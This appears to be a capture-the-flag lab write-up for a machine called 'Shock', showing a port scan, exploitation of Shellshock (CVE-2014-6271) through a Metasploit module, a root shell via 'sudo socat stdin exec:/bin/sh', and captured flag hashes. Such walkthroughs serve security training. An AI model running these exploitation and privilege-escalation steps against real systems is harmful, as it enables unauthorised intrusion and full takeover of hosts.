# Shock

**IP Address:** 172.31.1.3

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | vsftpd 3.0.3 |
| 22/tcp | open | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | open | http | Apache httpd 2.4.29 |
| 135/udp | open|filtered | msrpc |   |
| 500/udp | open|filtered | isakmp |   |
| 514/udp | open|filtered | syslog |   |
| 68/udp | open|filtered | dhcpc |   |

## Exploitation
### Exploit Details (metasploit)
* **Name** - Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
* **CVE** - CVE-2014-6271
* **Module** - exploit/multi/http/apache_mod_cgi_bash_env_exec
* **Disclosed** - 2014-09-24
* **References**
  * https://nvd.nist.gov/vuln/detail/CVE-2014-6271

1. Show metasploit options

Commands
```
show options
```

![Execute Exploit](images/exploit1.png)

2. Run exploit

Commands
```
run
shell
whoami
cat /home/scott/access.txt
```

![Execute Exploit](images/exploit2.png)

## Privilege Escalation
### Exploit Details (SUDO (socat))
* **Name** - SUDO (socat)
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A


Commands
```bash
sudo socat stdin exec:/bin/sh
whoami
/root/system.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
access.txt
5198cf7dbec41da68b367d5681f63996
system.txt
669fe3374599b663a0da972ecbf7e2cb
```